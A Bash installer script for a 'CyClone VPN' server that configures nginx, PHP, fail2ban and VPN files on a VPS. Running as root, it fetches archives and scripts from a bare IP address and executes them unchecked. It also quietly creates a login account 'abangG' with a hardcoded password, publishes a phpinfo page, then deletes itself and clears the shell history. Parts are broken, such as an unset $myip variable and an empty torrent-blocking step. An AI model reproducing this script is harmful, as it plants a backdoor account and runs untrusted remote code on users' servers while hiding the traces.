#!/bin/bash
#CREATE BY CyClone VPN
#NOT FOR SALE
#MUST HAVE PERMISSION IF WANT USE THIS SCRIPT
#THIS IS FOR EXPERIMENT ONLY

if [ $USER != 'root' ]; then
	echo "Sorry, for run the script please using root user"
	exit
fi
if [[ ! -e /dev/net/tun ]]; then
	echo "TUN/TAP is not available"
	exit
fi
echo "
AUTOSCRIPT BY CyCloneVPN Solution

PLEASE CANCEL ALL PACKAGE POPUP

TAKE NOTE !!!"
clear
echo "START AUTOSCRIPT"
clear

#set time zone malaysia
echo "SET TIMEZONE KUALA LUMPUT GMT +8"
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear
echo "

ENABLE IPV4 AND IPV6

COMPLETE 1%
"
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear


echo "
REMOVE SPAM PACKAGE

COMPLETE 5%
"
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear
echo "
UPDATE AND UPGRADE PROCESS

"
apt-get update;
apt-get -y upgrade;
apt-get -y install wget curl;
echo "
INSTALL COMMANDS
COMPLETE 18%
"
#get ip address
apt-get -y install aptitude curl

if [ "$IP" = "" ]; then
        IP=$(curl -s ifconfig.me)
fi



#motd
echo -e "\e[33m

  ____       ____ _                __     ______  _   _ 
 / ____   _ / ___| | ___  _ __   __\ \   / |  _ \| \ | |
| |  | | | | |   | |/ _ \| '_ \ / _ \ \ / /| |_) |  \| |
| |__| |_| | |___| | (_) | | | |  __/\ V / |  __/| |\  |
 \____\__, |\____|_|\___/|_| |_|\___| \_/  |_|   |_| \_|
      |___/                                             

   ================================================
   #                                              #
   #      WELCOME TO CyCloneVPN VPS SYSTEM !      #
   #      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~       #
   #            Telegram : @TogaSinki             #
   #   Copyright © CyCloneVPN Premium VPN™ 2017   #
   #                  by abangG                   #
   #     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~      #
   #     PLEASE TYPE 'menu' FOR EACH MISSION      #
   #                                              #
   ================================================
\e[0m" > /etc/motd
 
# fail2ban & exim & protection
apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
wget https://github.com/jgmdev/ddos-deflate/archive/master.zip;unzip master.zip;
cd ddos-deflate-master && ./install.sh
service exim4 stop;sysv-rc-conf exim4 off 

# nginx
apt-get -y install nginx php5-fpm php5-cli libexpat1-dev libxml-parser-perl
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "http://139.59.237.30/script/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>Assalamualaikum | Setup by abangG | telegram @TogaSinki</pre>" > /home/vps/public_html/index.php
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /etc/nginx/conf.d/vps.conf "http://139.59.237.30/script/vps.conf"
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf

# etc
wget -O /home/vps/public_html/client.ovpn "http://139.59.237.30/script/client.ovpn"
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
cd;wget http://139.59.237.30/script/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash abangG
echo "abangG:135135" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
clear

# restart service
service nginx restart
service php5-fpm restart
service fail2ban restart
cd

#swap ram
wget http://139.59.237.30/script/swap-ram.sh
chmod +x  swap-ram.sh
./swap-ram.sh

clear

echo "
BLOCK TORRENT PORT INSTALL
COMPLETE 95%
"


clear
echo "
COMPLETE 100%
NICE MUAHCHIKED
DONE.
"

echo "BY CyClone VPN"
echo "Webmin     :  http://$IP:10000"
echo "Proxy Port with 60000 & 8080"
echo "Login VPS via Putty/Connect Bot/Juice SSH and type menu"
echo "NOT FOR SALE"
echo "THANK YOU"
echo "BYE"
echo "PLEASE REBOOT TO TAKE EFFECT"
echo "TYPE reboot THEN ENTER "
cat /dev/null > ~/.bash_history && history -c
rm -f /root/ngn.sh

